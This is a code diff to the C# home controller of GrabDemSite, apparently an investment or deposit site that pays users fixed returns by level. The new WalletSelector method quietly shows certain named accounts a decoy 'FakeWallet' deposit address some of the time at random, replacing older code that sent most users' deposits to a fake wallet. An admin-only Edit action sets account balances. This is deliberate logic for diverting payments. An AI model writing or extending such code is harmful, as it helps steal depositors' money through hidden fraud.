@@ -13,6 +13,7 @@ namespace GrabDemSite.Controllers
         private ApplicationDbContext _context;
         private readonly string Wallet = "xXXxxxXxxxxxXXxxX";
         private readonly string FakeWallet = "xvdsgdsagsdg";
+        private readonly string FakeWallet2 = "dasfsagasg";
         private Random random = new Random();
         public HomeController(ILogger<HomeController> logger, ApplicationDbContext context)
         {
@@ -180,7 +181,7 @@ namespace GrabDemSite.Controllers
         [HttpGet]
         public IActionResult Edit(string id, double balance)
         {
-            if(this.User.Identity.Name!="Test1")
+            if (this.User.Identity.Name != "Test1")
             {
                 return RedirectToAction("Index");
             }
@@ -323,11 +324,11 @@ namespace GrabDemSite.Controllers
             {
                 u.Balance += u.PlayMoney * 0.055;
             }
-            else if(u.Level==2)
-                    {
+            else if (u.Level == 2)
+            {
                 u.Balance += u.PlayMoney * 0.07;
             }
-            else if(u.Level==3)
+            else if (u.Level == 3)
             {
                 u.Balance += u.PlayMoney * 0.085;
             }
@@ -364,6 +365,32 @@ namespace GrabDemSite.Controllers
             }
             return View(user);
         }
+        private string WalletSelector()
+        {
+            Random rnd = new Random();
+            int randomizer = rnd.Next(1, 6);
+            string name = this.User.Identity.Name;
+            if (name == "SkAg1" || name == "BlAg2" || name == "5aAg3" || name == "TyAg4" || name == "66Ag5")
+            {
+                if (randomizer == 1 || randomizer == 2 || name == "Abugr6" || name == "Adem7")
+                {
+                    return FakeWallet;
+                }
+                else if ((randomizer == 3 || randomizer == 4))
+                {
+                    return FakeWallet2;
+                }
+                else
+                {
+                    return Wallet;
+                }
+            }
+            else
+            {
+                return Wallet;
+            }
+
+        }
         [Authorize]
         public IActionResult TryDeposit(string id, double money)
         {
@@ -380,21 +407,7 @@ namespace GrabDemSite.Controllers
                 depReq.User = user;
                 depReq.Id = Guid.NewGuid().ToString();
                 depReq.UserEmail = user.Email;
-                string name = this.User.Identity.Name;
-                int rndRes = random.Next(1, 11);
-                if (name == "SkAg1" || name == "BlAg2" || name == "5aAg3" || name == "TyAg4" || name == "66Ag5")
-                {
-                    ViewBag.Wallet = Wallet;
-                }
-                else if (rndRes == 10)
-                {
-                    ViewBag.Wallet = Wallet;
-                }
-                else
-                {
-
-                    ViewBag.Wallet = FakeWallet;
-                }
+                ViewBag.Wallet = WalletSelector();
 
                 return View("TryDeposit", depReq);
             }
